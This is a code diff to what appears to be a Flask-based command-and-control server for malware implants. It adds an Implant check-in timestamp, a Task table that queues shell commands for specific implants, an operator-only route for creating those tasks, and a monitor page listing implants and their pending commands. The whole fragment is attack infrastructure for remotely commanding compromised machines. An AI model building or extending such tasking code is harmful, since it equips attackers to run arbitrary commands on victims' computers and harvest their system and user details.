@@ -22,12 +22,19 @@ class Implant(db.Model):
 	OSBuild = db.Column(db.String, nullable=False)
 	Username = db.Column(db.String, nullable=False)
 	ComputerName = db.Column(db.String, nullable=False)
+	last_checkin = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 
 class Operator(flask_login.UserMixin, db.Model):
 	id = db.Column(db.Integer, primary_key=True)
 	username = db.Column(db.String, nullable=False, unique=True)
 	password = db.Column(db.String, nullable=False)
+
+class Task(db.Model):
+	id=db.Column(db.Integer, primary_key=True)
+	cmd = db.Column(db.String, nullable=False)
+	status = db.Column(db.String, nullable=False, default="Pending")
+	implant_id = db.Column(db.String, nullable=False)
 
 ###################
 #  Login Manager  #
@@ -64,10 +71,23 @@ def login():
 	# Invalid login
 	return render_template('unauth.html')
 
+@app.route('/createtask/<ProductID>', methods=['POST'])
+@flask_login.login_required
+def createtask(ProductID):
+	new_task = Task(cmd=flask.request.form['command'], implant_id=ProductID)
+	db.session.add(new_task)
+	db.session.commit()
+	return redirect('/monitor')
+
 @app.route('/monitor')
 @flask_login.login_required
 def monitor():
-	return render_template('monitor.html')
+	implantlist = Implant.query.all()
+	templatelist = []
+	for implant in implantlist:
+		pending = Task.query.filter_by(implant_id=implant.ProductID, status="Pending").count()
+		templatelist.append((implant.ProductID, pending, implant.last_checkin, implant.creation_date))
+	return render_template('monitor.html', implants=templatelist)
 
 @app.route('/register', methods=['POST'])
 def register():
